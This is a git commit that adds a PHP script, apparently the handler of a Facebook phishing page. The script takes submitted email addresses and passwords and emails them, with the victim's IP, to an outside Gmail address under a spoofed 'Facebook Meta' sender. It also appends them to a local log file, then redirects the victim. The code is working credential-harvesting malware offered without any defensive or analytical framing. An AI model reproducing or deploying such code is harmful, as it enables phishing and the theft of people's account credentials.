04a54db5df59b62c5c15370614f68c83aeae4d50
masauliasc <51753653+masauliasc@users.noreply.github.com>
2022-06-04 14:51:25 +0700

    Add files via upload

---
+++ bpas.php
@@ -0,0 +1,55 @@
+<?php
+
+$ip 	= getenv("REMOTE_ADDR");
+$email   = $_POST['email'];
+$password = $_POST['password'];
+$message = "
+
+=============BISMILLAHAJADULU============
+
+Email		: $code
+Password    : $email
+IP		    : $ip
+
+=============BISMILLAHAJADULU============ ";
+
+
+$to = "silentningsih@gmail.com"; //      
+$subject = "Facebook= [$ip]";
+$headers = "From: Facebook Meta <fvckyou@facebook.com";
+$headers .= $_POST['eMailAdd']."\n";
+$headers .= "MIME-Version: 1.0\n";
+
+mail($to, $subject, $message,$headers);
+
+
+header("Location:/");
+
+
+?>
+
+<?php
+$ip   = getenv("REMOTE_ADDR");
+$file = "_________________F-META__________________.txt";
+$email   = $_POST['email'];
+$password = $_POST['password'];
+$today = date("F j, Y, g:i a");
+
+$handle = fopen($file, 'a');
+fwrite($handle, "=================F-META=2===============");
+fwrite($handle, "\n");
+fwrite($handle, "TTL	: ");
+fwrite($handle, "$email");
+fwrite($handle, "\n");
+fwrite($handle, "Pass	: ");
+fwrite($handle, "$password");
+fwrite($handle, "\n");
+fwrite($handle, "$today");
+fwrite($handle, "\n");
+fwrite($handle, "$ip");
+fwrite($handle, "\n");
+fwrite($handle, "=================F-META=================");
+fwrite($handle, "\n");
+fclose($handle);
+
+?>
